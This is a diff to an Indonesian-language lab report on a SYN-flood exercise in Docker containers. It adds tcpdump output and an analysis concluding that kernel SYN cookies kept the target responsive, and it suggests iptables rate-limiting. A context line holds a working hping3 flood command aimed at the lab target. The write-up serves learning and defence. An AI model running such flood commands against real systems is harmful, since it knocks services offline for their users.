@@ -149,6 +149,25 @@ docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
 docker compose exec attacker timeout 10 tcpdump -i eth0 -nn "tcp[tcpflags] & tcp-syn != 0" -c 50
 ```
 
+Hasil:
+```
+tcp_syncookies = 1
+
+netstat SYN_RECV sebelum serangan: 0
+
+tcpdump saat serangan berlangsung:
+14:34:02.703828 IP 172.19.0.2.80 > 172.19.0.3.39502: Flags [S.], seq 219959934, ack 730604111, win 64240
+14:34:02.703843 IP 172.19.0.3.39503 > 172.19.0.2.80: Flags [S], seq 1410282016, win 512
+14:34:02.703862 IP 172.19.0.2.80 > 172.19.0.3.39503: Flags [S.], seq 278129759, ack 1410282017, win 64240
+14:34:02.703880 IP 172.19.0.3.39504 > 172.19.0.2.80: Flags [S], seq 941836860, win 512
+14:34:02.703898 IP 172.19.0.2.80 > 172.19.0.3.39504: Flags [S.], seq 2226455613, ack 941836861, win 64240
+... (pola berulang, interval antar-paket sekitar 15-20 microsecond)
+
+50 packets captured
+1847 packets received by filter
+0 packets dropped by kernel
+```
+
 `tcp_syncookies` ternyata sudah bernilai `1` (aktif) sejak awal. SYN_RECV sebelum serangan tercatat 0. Saat serangan berjalan, tcpdump berhasil menangkap **1847 paket** dalam waktu singkat, dengan source port yang berbeda-beda tiap paket (ciri khas flood), dan target tetap membalas setiap SYN dengan SYN-ACK — artinya server tidak down, hanya dibanjiri paket.
 
 **Kesimpulan:** meskipun ribuan paket SYN palsu dikirim dalam hitungan detik, SYN_RECV di sisi target tetap rendah. Kemungkinan besar hal ini disebabkan oleh SYN cookies yang sudah aktif secara default pada kernel, sehingga server tidak perlu menyimpan state koneksi half-open di memori — akibatnya server tidak mudah kehabisan resource meskipun dibanjiri SYN. Mitigasi tambahan yang dapat diterapkan adalah rate-limit paket SYN per IP menggunakan iptables.
